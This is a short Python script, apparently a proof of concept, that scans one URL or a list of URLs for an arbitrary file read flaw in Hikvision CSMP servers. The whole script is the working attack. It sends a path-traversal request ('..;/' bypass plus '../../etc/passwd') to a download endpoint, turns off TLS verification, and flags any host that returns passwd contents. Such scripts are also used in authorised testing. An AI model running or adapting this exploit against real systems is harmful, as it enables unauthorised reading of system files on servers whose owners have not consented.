import urllib3
import re,string,random
from urllib.parse import urljoin
import argparse
import ssl
import urllib.request
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = url+"/center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
    }
    try:
        response = urllib.request.Request(target, headers=headers, method="GET", unverifiable=True)
        res = urllib.request.urlopen(response)
        status_code = res.getcode()
        content = res.read().decode()
        if status_code ==200 and 'root:' in content and 'usr' in content:
            print(f"\033[31mDiscovered；{url}: HikvisionCSMP_download_AribitraryFileRead!\033[0m")
            return True
    except Exception as e:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")
